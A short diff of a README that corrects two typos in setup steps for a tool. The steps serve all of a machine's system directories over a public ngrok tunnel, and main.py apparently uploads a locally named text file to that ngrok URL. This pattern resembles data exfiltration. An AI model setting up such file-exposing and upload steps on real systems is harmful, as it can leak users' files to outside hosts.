@@ -29,9 +29,9 @@ $ ngrok config add-authtoken <token>
 ```
 $ ngrok http 8000
 ```
-If successfull, you should see all of your system directories as embeded links.
+If successful, you should see all of your system directories as embeded links.
 
-6, Copy ngrok URL and paste into `main.py` (line 52):
+6. Copy ngrok URL and paste into `main.py` (line 52):
 ```python
 url = "https://ngrok-url-here"
 files = {'file': open(f'{curr_path}.txt', 'rb')}
